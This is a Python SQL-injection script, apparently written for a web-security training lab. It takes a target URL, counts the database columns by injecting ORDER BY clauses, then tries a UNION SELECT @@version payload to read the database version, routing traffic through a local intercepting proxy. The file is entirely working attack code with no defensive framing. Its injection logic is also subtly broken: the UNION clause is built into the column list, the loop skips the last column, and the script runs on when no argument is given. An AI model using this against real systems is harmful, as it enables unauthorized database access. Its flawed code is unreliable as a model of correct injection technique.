import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_no_of_column(url):
    path = "/filter?category=Pets"
    payload = "' order by "

    for i in range(1,11):
        res = requests.get(url + path + payload + str(i) + "-- ", verify=False, proxies=proxies) 
        
        if res.status_code == 500:
            print(i-1)
            return i-1        
    
    return False

def get_verison(url, no_of_column):
    path = "/filter?category=Pets"
    payload = " UNION SELECT @@version " 

    for i in range(1, no_of_column):
        injection_list = ['null'] * no_of_column
        injection_list[i-1] = payload

        final_injection = url + path + "' " + ",".join(injection_list) + "-- "

        res = requests.get(final_injection, proxies=proxies, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")

        th_tags = soup.find_all("th")
        for tag in th_tags:
            value = tag.text.strip()
            # Check if it looks like a version string
            if value[0].isdigit():
                print("database version:", value)
                return True
    return False

proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080",
}

if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] input invalid")
        print("[-] %s <url>" %sys.argv[0])

    no_of_column = get_no_of_column(url)

    if not get_verison(url, no_of_column):
        print("version detection failed")
        sys.exit(-1)